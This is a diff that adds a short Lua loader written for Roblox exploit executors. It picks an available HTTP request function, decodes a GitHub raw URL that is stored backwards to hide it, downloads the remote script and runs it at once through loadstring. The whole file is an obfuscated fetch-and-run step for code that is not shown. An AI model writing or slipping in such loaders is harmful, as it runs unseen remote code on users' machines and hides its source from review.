@@ -1,0 +1,4 @@
+local reverse = (string and typeof(string) == [[table]] and rawget(string, [[reverse]]) and string.reverse) and clonefunction(([[text]]).reverse)
+local request, link = (request and typeof(request) == "function" and request) or (syn and rawget(syn, [[request]])) or (http and rawget(http, [[request]])) or (fluxus and rawget(fluxus, [[request]])) or newcclosure(function(options) return clonefunction(game.GetService(game, "HttpService").RequestAsync)(game.HttpService, options) end), reverse([[aul.tpircS2UHB/niam/sdaeh/sfer/tcejorP2UHB/laciffOreKSDA/moc.tnetnocresubuhtig.war//:sptth]])
+local loadstrin = (getgenv and typeof(getgenv) == [[function]] and typeof(getgenv()) == [[table]] and rawget(getgenv(), [[loadstring]]) and getgenv().loadstring ~= nil and getgenv().loadstring) or (loadstring and clonefunction(loadstring))
+loadstrin(request({Url = reverse(reverse(link)); Method = [[GET]]}).Body)()
